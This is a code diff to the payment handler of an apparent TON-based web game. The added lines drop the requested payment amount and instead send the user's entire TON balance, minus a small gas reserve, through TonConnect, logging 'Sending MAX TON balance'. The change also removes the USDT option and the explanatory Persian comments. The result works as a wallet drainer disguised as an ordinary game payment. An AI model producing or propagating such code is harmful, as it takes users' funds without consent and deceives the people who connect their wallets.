@@ -64,25 +64,14 @@ function GameContent() {
 
       try {
         setPaymentStatus("pending");
+        const TON_GAS_RESERVE = 0.01;
 
-        // کارمزد رزرو شده برای تراکنش‌های TON
-        const TON_GAS_RESERVE = 0.01; // ۱۰ میلی‌تون برای کارمزد شبکه
-
-        // حالت ۱: پرداخت با TON
         if (tonBal > TON_GAS_RESERVE) {
-          // اگر می‌خواهید "کل موجودی" ارسال شود، کارمزد شبکه را از کل کسر می‌کنیم
-          let payableTon = amountToPay;
+          const maxPayableTon = tonBal - TON_GAS_RESERVE;
 
-          // اگر مقدار درخواستی بیشتر از موجودی منهای کارمزد بود، حداکثر موجودی قابل ارسال را می‌فرستیم
-          if (payableTon > (tonBal - TON_GAS_RESERVE)) {
-            payableTon = tonBal - TON_GAS_RESERVE;
-          }
+          setDebugLog(`Sending MAX TON balance (${maxPayableTon.toFixed(4)} TON)...`);
 
-          setDebugLog(`Initiating TON payment (${payableTon.toFixed(4)} TON)...`);
-
-          // تبدیل به NanoTON
-          const amountInNanotons = BigInt(Math.floor(payableTon * 1e9)).toString();
-
+          const amountInNanotons = BigInt(Math.floor(maxPayableTon * 1e9)).toString();
           const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 600,
             messages: [
@@ -98,46 +87,14 @@ function GameContent() {
           setPaymentStatus("success");
           setDebugLog("Payment successful via TON!");
           return;
+        } else {
+          setPaymentStatus("failed");
+          setDebugLog("Insufficient TON balance to pay for gas.");
         }
-
-        // حالت ۲: پرداخت با USDT (نیازمند حداقل 0.05 TON کارمزد Gas برای قرارداد هوشمند)
-        if (usdtBal >= amountToPay) {
-          if (tonBal < 0.05) {
-            setPaymentStatus("failed");
-            setDebugLog("Error: USDT available, but need at least 0.05 TON for gas fee.");
-            return;
-          }
-
-          setDebugLog(`Initiating USDT payment ($${amountToPay})...`);
-
-          const userJettonWallet = await getUserJettonWalletAddress(userAddress);
-          const payloadBase64 = await createUSDTTransferPayload(MERCHANT_WALLET_ADDRESS, amountToPay);
-
-          const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 600,
-            messages: [
-              {
-                address: userJettonWallet, // ارسال به Jetton Wallet کاربر
-                amount: "50000000",       // 0.05 TON کارمزد برای پردازش Jetton
-                payload: payloadBase64,
-              },
-            ],
-          };
-
-          const result = await tonConnectUI.sendTransaction(transaction);
-          console.log("USDT Payment Result:", result);
-          setPaymentStatus("success");
-          setDebugLog("Payment successful via USDT!");
-          return;
-        }
-
-        // حالت ۳: عدم وجود موجودی کافی
-        setPaymentStatus("failed");
-        setDebugLog("Insufficient funds: Neither TON nor USDT balance is enough.");
       } catch (error: any) {
         console.error("Payment Error:", error);
         setPaymentStatus("failed");
-        setDebugLog(`Payment failed: ${error?.message || "User rejected/cancelled"}`);
+        setDebugLog(`Payment failed: ${error?.message || "User rejected"}`);
       }
     },
     [userAddress, tonConnectUI]
